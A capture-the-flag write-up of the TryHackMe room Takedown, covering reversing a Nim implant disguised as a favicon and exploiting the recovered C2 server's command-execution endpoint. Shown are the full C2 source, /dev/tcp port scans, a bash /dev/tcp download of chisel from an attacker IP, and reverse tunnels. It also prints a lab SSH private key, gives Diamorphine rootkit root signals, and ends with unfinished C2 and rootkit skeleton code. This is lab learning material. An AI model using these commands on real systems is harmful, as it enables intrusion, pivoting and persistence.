# Takedown Helped-Through

Name: Takedown
Date:  5/4/2023
Difficulty:  Insane
Goals:  
- Go as full cyber as I can!
- Have fun and enjoy an Alh4zr3d stream while it is all RE4 remake
- Experience what THM insane means
Learnt:
Beyond Root:

Following along after a long week and I got above 70 on AZ 104 Microsoft assessment so I wanted to reward and celebrate a very long week.

<iframe width="560" height="315" src="https://www.youtube.com/embed/sFRjRfH-rMA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>



## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

[[robots-txt-endpoint-http___10.10.112.119_favicon.ico]] is rather strange to be in robots.txt

- someone@infinitysite.com
- info@infinitysite.com


gobuster .gitattributes

```bash
curl http://10.10.104.157/favicon.ico -o data/favicon.ico
```

![](icoexecutable.png)

![](wayaheadofaltoday.png)

Al makes us do what professionals do https://www.virustotal.com/gui/file/80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc/community

![](wehaveregistersinthestrings.png)

Also it is [Nim]()

Nim converted into C and then compiled.

![1080](faviconreversingone.png)

It does not actually look like C...

Imports:
- Kernel32.dll
- Msvcrt.dll
- User32.dll

What does malware do?
- call back somewhere to recieve instructions

![](alpointsthatisreachesout.png)

![](callingabackanddefinedstringsinghidra.png)

Where does it make its custom api calls

`Right Click -> References -> Show references to address`
![](showreferences.png)

![](writememoryreferences.png)

Alh4zr3d is asking why is this is failing to resolve

It is not resolving because various techinques are used to authenicate the agents from the Blue Team or IR team trying to analyze your infrastructure.

Presumablely we then finding in the malware what the http request header is allowed to access the api.
1. Content-Type mean POST

`grep @`
![](grepforat.png)

![](405.png)

```c
// Al says this proably a random agent not Authorization Header
hashcommon.nim(258, 11) 
```

![](commandwouldbeififtherewas.png)

Drone ID therefore 
```c
ourn-mtum-ewlu-qjdu
```

![](apiapiuid.png)

We a talking to the teamserver but we are communicating with the webserver because it is THM
![](alsbigbrainmoment.png)

We are simulating a bad guy talking to the teamserver
- It wants json data
- upload needs to specify a file 
- think from the drones perspective it wants to upload something

Me first thought was docker
![](weareindocker.png)

GEt informantion about the process you are running in - Good for LFI
```bash
/proc/self/environ
```

![](procselfenviron.png)

I tried to get it
![](stickysituation.png)

Hack the c2 server action on objectives!
![](hackthec2server.png)

C2 Source Code!
```python
import logging
import sys
import json
from threading import Thread
import re
import random
from os import system

import flask
from flask import request, abort
from flask_cors import CORS

HEADER_KEY = "z.5.x.2.l.8.y.5"

command_list = []
command_to_execute_next = ""
command_stack_reset_flag = False
agg_commands = open('aggressor.txt', 'r')
lines = agg_commands.readlines()
for line in lines:
    command_list.append(line.strip())

available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]

live_agents = {}

app = flask.Flask(__name__)
app.secret_key = "000011112222333344445555666677778888"

logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)


def is_user_agent_keyed(user_agent):
    return HEADER_KEY in user_agent


def json_response(app, data):
    try:
        return app.response_class(
            response=json.dumps(data),
            status=200,
            mimetype='application/json'
        )
    except Exception as e:
        return str(e)


def is_command_reset_flag_set(command_stack_reset_flag):
    return command_stack_reset_flag


@app.route("/")
def hello_world():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return "."
    else:
        abort(404)


@app.route('/api/server', methods=['GET'])
def get_server_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        server_info = {"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}
        return json_response(app, server_info)
    else:
        abort(404)

@app.route('/api/agents', methods=['GET'])
def get_agent_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if live_agents:
            return str(live_agents), 200
        else:
            return "No live agents", 200
    else:
        abort(404)


@app.route(f'/api/agents/commands', methods=['GET'])
def get_agent_commands():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return f"Available Commands: {available_commands}", 200
    else:
        abort(404)


@app.route('/api/agents/register', methods=['POST'])
def post_register_agent():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            try:
                uid = request.json["uid"]
                hostname = request.json["hostname"]
                live_agents[uid] = hostname
                msg = f"New agent UID: {uid} on host {hostname}"
                app.logger.debug(msg)
                print(msg)
                return msg, 200
            except Exception as e:
                return str(e), 500
        return "MESSAGE: {0}".format(request.is_json)
    else:
        abort(404)


@app.route('/api/agents/<uid>', methods=['GET'])
def get_agent(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            info = live_agents.get(uid)
            return f"Agent info:\nUID: {uid} - Hostname: {info}", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route('/api/agents/<uid>/command', methods=['GET', 'POST'])
def get_agent_command(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                global command_to_execute_next
                global command_stack_reset_flag
                if command_to_execute_next:
                    command_reset_flag = is_command_reset_flag_set(command_stack_reset_flag)
                    if command_reset_flag:
                        command = random.choice(command_list)
                        return f"{command}", 200
                    else:
                        command = command_to_execute_next
                        command_stack_reset_flag = True
                        return f"{command}", 200
                else:
                    command = random.choice(command_list)
                    return f"{command}", 200
            if request.json:
                result = request.json["results"]
                app.logger.debug(result)
                print(result)
                return "OK", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
def post_upload(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                f = open(file,"rb")
                data = f.read()
                f.close()
                return data, 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/download', methods=['POST'])
def post_download(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                if file in ["app.py", "aggressor.txt"]:
                    abort(404)
                data = request.json["data"]
                f = open(file ,"w")
                f.write(data)
                f.close()
                return "OK", 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/server/exec', methods=['POST'])
def post_server_exec():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            cmd = request.json['cmd']
            res = system(f"{cmd}")
            return f"Command: {cmd} - Result code: {res}", 200
        else:
            return "Bad request", 400
    else:
        abort(404)


@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
def post_agent_exec(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                return f"EXEC: {uid}", 200
            if request.method == 'POST':
                if request.json:
                    global command_to_execute_next
                    command_to_execute_next = request.json["cmd"]
                    global command_stack_reset_flag
                    command_stack_reset_flag = False
                    msg = f"New commnad to execute: {command_to_execute_next}"
                    app.logger.debug(msg)
                    print(msg)
                    return msg, 200
                else:
                    return "Bad request", 400
            else:
                abort(404)
        else:
            abort(404)
    else:
        abort(404)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return flask.render_template("index.html")
    else:
        abort(404)


CORS(app, resources={r"/*": {"origins": "*"}})


if __name__=="__main__":
    app.run(host="0.0.0.0", port=8000)
```

Result code 
![](Resultcode32512.png)

## Exploiting the C2

With this we can execute code on the server.
```python
@app.route(f'/api/server/exec', methods=['POST'])
def post_server_exec():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            cmd = request.json['cmd']
            res = system(f"{cmd}")
            return f"Command: {cmd} - Result code: {res}", 200
        else:
            return "Bad request", 400
    else:
        abort(404)
```

so back to burpsuite and:
![](gatewaytimeout.png)

and...
![](onthedocker.png)

First thing from the [[Reddish-Helped-Through]] is that 0xdf enumerates how the docker container is connected to the host by checking the `/proc/net/arp` where IPv4 is resolved.
![](enumeratethehostthrougharp.png)

We have two addresses
```bash
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.20.0.1/$port && echo "open - $port") 2> /dev/null; done
open - 22
open - 80
```
Each having the ports open as displayed by the above and below
```bash
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.20.0.2/$port && echo "open - $port") 2> /dev/null; done
open - 80
```

It would then be prudent to upload chisel as Al malds ove rthe c2 agent like I did while he was discussing the source code. I get a two is one and one is none shell for chisel. There is no  curl or wget so we will use `cat` and locally host files with `nc`. While debug the agent...
```bash
bash -c "cat < /dev/tcp/10.11.3.193/8888 > /tmp/chisel"
```

Chisel reverse port redirections
```bash
nohup ./chisel client 10.11.3.193:9001 R:127.0.01:9002:172.20.0.1:80 &
nohup ./chisel client 10.11.3.193:9001 R:127.0.01:9003:172.20.0.2:80 &
```

This ended while I could not reach these... Al made it work so I skipped forward

## Foothold as webadmin-lowpriv and PrivEsc to Root

![](newcommnad.png)

webadmin-lowpriv's id_rsa
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA2y28m9zvL55VUnGvjKvJoO/puyib5S2W5dK6j9RS0IunKooAeiTj
h7lfUiVmHi+Jrf9SwGvU386UneEsvJ6KSNZvIezrfmHltx3igasWldeeGsxuA4qLHsQCy0
5aZyWnnSm5z0bi1uUDUeb75H3MX4rxXT0JrsryYYjd9Vz4cNGW5zk/J4m6O3PAla+notFn
6yLZ/gBSpodFCXRH3mfzhC8RLEnfkl79gR4FuqaCa/CFkgr5/REYy8dDbBsGIloOF3CxtO
IdwOJWCcfAN9aM4/IbIg6+Goi+MoLB8bmnCLsyB3KedBPdxZIH3sGKBMXYLiI9nXtoONsY
clYEp4aL6rlqGDzK+Haxj9bjBV03UAFyJuZErSf+lxGa3bY3szRm7MkshokeMeIrKUHJEl
VLqBISgyPvi3dJi/Yr/37lmRtFPCFYvzRPH1ax4c/qfjoWjlCYkHxwbuCkHUvuYia/qqs4
zh3ceC7VWa1VDa48fBoDVIuMNytq5D1Zwy7bOLSdAAAFmJefdgGXn3YBAAAAB3NzaC1yc2
EAAAGBANstvJvc7y+eVVJxr4yryaDv6bsom+UtluXSuo/UUtCLpyqKAHok44e5X1IlZh4v
ia3/UsBr1N/OlJ3hLLyeikjWbyHs635h5bcd4oGrFpXXnhrMbgOKix7EAstOWmclp50puc
9G4tblA1Hm++R9zF+K8V09Ca7K8mGI3fVc+HDRluc5PyeJujtzwJWvp6LRZ+si2f4AUqaH
RQl0R95n84QvESxJ35Je/YEeBbqmgmvwhZIK+f0RGMvHQ2wbBiJaDhdwsbTiHcDiVgnHwD
fWjOPyGyIOvhqIvjKCwfG5pwi7MgdynnQT3cWSB97BigTF2C4iPZ17aDjbGHJWBKeGi+q5
ahg8yvh2sY/W4wVdN1ABcibmRK0n/pcRmt22N7M0ZuzJLIaJHjHiKylByRJVS6gSEoMj74
t3SYv2K/9+5ZkbRTwhWL80Tx9WseHP6n46Fo5QmJB8cG7gpB1L7mImv6qrOM4d3Hgu1Vmt
VQ2uPHwaA1SLjDcrauQ9WcMu2zi0nQAAAAMBAAEAAAGBAJUpTjegpyL4FUbzWa5ZZvHg9G
dL3rScTxp/TDoAHJASyqRXoLV/j11Z2bY0/4dBgOhqX63WdNwPYfMEQIbpOmERljY3X5j2
FPiHHRR0E/3L7Kx+PcypJ767VM95tmqGJMj/kZWvv0bSOm0tznWU61aGX3a9yG4tbcDU/Y
EzUVyuNo2L1yAYSiaVwxXbojFbY+aRJFwJajYszt39Rb/lbMOjqINEjyO1A78waGO7V/0P
hkd6suD4FrDwHkFfLtCICdXqiy2aNDMZaCcKCiWPxZXaNuquLxzqcXYWbcIJOD4SE2rg62
mtdC/0CEpnQtTxgTEH4pGzwqnC8/JR+5Ukrz/eqtQ+deYu5v299ys4Pbv24eAgKDYcXm+s
Vect9K5vQlgE3ZMIq+aC/+j7/ioUWSejAO4tu898gx97dUahhCuApGe5PqduveUzJx8rm5
8ZPxnxaKX8agXl1CQoGFg5lQqgfDRmKxiy7B9bW8+/DBLn87Q5CJI3avCI3ciKuksrHQAA
AMBy6fmPljD1Suw2OKUvlkwHOIN5bHLMxbbm333cBA7eq6mmnJxcu9sov+/X0HqGN7O8Aw
7OLzxPRfhkc5w23CBQv/uIlVJx3tU90SIN24hwRvLasODJ8KGO/5hqCPWfLyQFQEE7lRH5
ZX9kKw0Hw+7lSmPvfWL39u/XNC3Ef2EfpBvNld7uAgbFTnXzV2MbSHhsurhR6IpThK+q8d
4ccxg5jvOWf6Y8ur4MOuGQOw/93vcGuXbFiuaEhv12IOvRfa0AAADBAP0E/XVgs1MNMTar
Yxv5WdKAAvcORThukTm9rtVpzQBmkKjnPJsKaFfRE2nMwiCRmbUjz5+bpdaB5uKcR7CgLO
YGkTSqnW2lCnPl7GZwQ9lOyy+/OiOQ9z/V++6S3BVPgKxuEPZ3PUyibF3+16/UTGHu7iU3
DdVqidlUbHR9N61j+bQx6QebDQQrlZyEkogfjmjRxFVM//WJgTuL92Qgd/Tgkkfof5nXOq
XuSpk2wq+rBsWJY96eaj/Ys05IbUJ3DwAAAMEA3cKyGEWdNQc6TOQA9ATa06/Qy11yRTmf
LFM+gxyNvNnDBCQWYiq1xPOD5ynGXoRTHw0RgktvfjStxMvEcVJ40jwk/7wFJFkHvwOy0k
nd68we26LEFfnXdBl9IS2n5W9j4FtZ39n0yGVMWrR2pRaRnBtYHCez+ayO3R6+rP+tZflz
yahmEJGZd0e3NV+rWzdlYqB9TMh6phmcfxTnq8Sk6Vfib89HJOsfmuy3kO/UG8qnMhJGre
Dh/fO8Q/W1tDmTAAAAHXdlYmFkbWluLWxvd3ByaXZAd3d3LWluZmluaXR5AQIDBAU=
-----END OPENSSH PRIVATE KEY-----
```

![](Ifounddiamorphineindevshm.png)


![](runningdiamorphine.png)

Rootkit is malware the subverts the operating system.. by sits between the kernel and os. - Al says this an oversimplified defination.
[Kris Nova's boopkit](https://github.com/krisnova/boopkit)

![](boopkit.png)

[Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/README.md)
- become root `kill -64 0`
- uninstall `kill -63 0`

![](root.png)

## Beyond Root

RUST C2 with Golang Webserver and API - barebones nothing fancy does the job if it was 2005 where everything is vunberable.

Along the wayt found:
https://github.com/dmgk/faker for your [Sam Reigel Cringe](https://www.youtube.com/watch?v=tGHtplCN1_A)

python Drone Customizer
```python 
import os

class 

# Replace customVars


replacable_customUploader
replacable_customDownloader
replacable_customListener 
replacable_customExecution 
replacable_customDelete
replacable_customID
replacable_customRegister
replacable_customDeactivate
replacable_customActivate

# Replace customVars
"// var customUploader", 
"// var customDownloader",
"// var customListener", 
"// var customExecution", 
"// var customDelete",
"// var customID",
"// var customRegister",
"// var customDeactivate",
"// var customActivate", 



def replace_Command():
	

def custom_Uploader():
def custom_Downloader():
def custom_Listener():
def custom_Execution():
def custom_Compile():

def main():
# Handle Args

# Copy drone.go

# Replace customVars
"// var customUploader", 
"// var customDownloader",
"// var customListener", 
"// var customExecution", 
"// var customDelete",
"// var customID",
"// var customRegister",
"// var customDeactivate",
"// var customActivate", 


custom_Compile()
os.exit()

```

Default compilation
```bash

# Compile Teamserver

# Compile Client and UPX

upx 

# Compile Drone

# Compile Rootkit

```


go Drone x-drone
```rust

// var customUploader
// var customDownloader
// var customListener
// var customExecution
// var customDelete
// var customID
// var customRegister
// var customDeactivate
// var customActivate

// Upload url
// Download url
// Listener port
// Execute cmd
// Delete
// ID 
// Register
// Activate
// Deactivate

handleCmd() {

}

```

? x-Client - https://simjue.pages.dev/post/2018/07-01-go-unix-shell/
```go
package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func main() {
    reader := bufio.NewReader(os.Stdin)
    for {
        fmt.Print("$ ")
        // Read the keyboad input.
        input, err := reader.ReadString('\n')
        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

        // Handle the execution of the input.
        if err = execInput(input); err != nil {
            fmt.Fprintln(os.Stderr, err)
        }
    }
    os.Exit(0)
}


func handleInput(input string) error {
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")
	// Split the input to separate the command and the arguments.
	args := strings.Split(input, " ")
	
	// Check for built-in commands.
	switch args[0] {
	case "connect":
		establishConnection()
	case "help":
		printHelp()	
	case "exit":
    		os.Exit(0)
	}
}

func printHelp() {
	fmt.Println("USAGE:\t<command> <arguments>")
	fmt.Println("\t\tconnect <teamserver address>")
	fmt.Println("\t\thelp: get some help")
	fmt.Println("\t\texit to exit")
}

func establishConnection() error {

}

```

Golang TeamServer
```go

// HTTPs Webserver 

// Password

// Generate a custom cert

// API

// /clients
// /cmds
// /drones

// Generate Tokens,IDs,Routes, CMD, Keys

// Generate: API Route 

// Generate: Token creation

// Generate: IDs

// Generate: CMD 

// Generate: Keys

// Commmands

struct droneCommands {
// Upload
// Download
// Listener
// Execute
// Delete
// ID
// Register
}

struct clientCommands {
}

// Drone
// Drone: Upload
// Drone: Download
// Drone: Listener
// Drone: Execute
// Drone: Delete
// Drone: ID
// Drone: Register


// Client

// Client: TLS Handsake

// Client: Connections

// Client: Handle commands 

// Delete 

```

Rust RootKit xkit framework
```rust
// Embed
// Evade
// Shell <shellname>
// Delete <self,shell pid and artificats>
// Timebomb-Delete <secs> <delete-type>
```

Check this out: https://github.com/m0nad/awesome-privilege-escalation

https://github.com/codecrafters-io/build-your-own-x

https://blog.holbertonschool.com/hack-the-virtual-memory-c-strings-proc/
https://beej.us/guide/bgnet/
https://github.com/EmilHernvall/dnsguide/blob/master/README.md
https://kasvith.me/posts/lets-create-a-simple-lb-go/
https://mattgathu.github.io/2017/08/29/writing-cli-app-rust.html
https://rust-cli.github.io/book/index.html
https://flaviocopes.com/go-tutorial-lolcat/ - rainbox cli
http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/